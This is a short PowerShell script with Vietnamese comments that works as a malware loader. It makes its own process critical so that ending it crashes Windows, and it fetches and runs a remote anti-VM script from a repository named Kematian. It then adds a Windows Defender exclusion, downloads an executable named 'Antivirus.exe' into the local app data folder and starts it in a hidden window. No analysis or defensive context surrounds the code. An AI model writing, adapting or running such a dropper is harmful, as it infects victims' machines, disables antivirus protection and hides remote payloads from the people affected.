Add-Type @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcessHelper {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int RtlSetProcessIsCritical(uint isCritical, ref uint refValue, uint unknown);

    public static void SetProcessCritical() {
        uint isCritical = 1;  // Process is critical
        uint refValue = 0;    // Reserved, must be zero
        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
    }

    public static void UnsetProcessCritical() {
        uint isCritical = 0;  // Process is no longer critical
        uint refValue = 0;    // Reserved, must be zero
        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
    }
}
"@

# Đặt tiến trình hiện tại là Critical Process
[CriticalProcessHelper]::SetProcessCritical()

try {
    # Tải và chạy tập lệnh từ URL
    $url = "https://raw.githubusercontent.com/macedonianlegend/Kematian/main/frontend-src/antivm.ps1"
    $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
    Invoke-Expression $scriptContent
}
catch {
    Write-Host "Đã xảy ra lỗi khi chạy tập lệnh từ URL: $_"
}
finally {
    # Gỡ trạng thái Critical Process
    [CriticalProcessHelper]::UnsetProcessCritical()
    Write-Host "Đã tắt Critical Process"
}


$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
$output = "$env:localappdata\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Add-MpPreference -ExclusionPath $output 
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -WindowStyle Hidden -FilePath $output
}
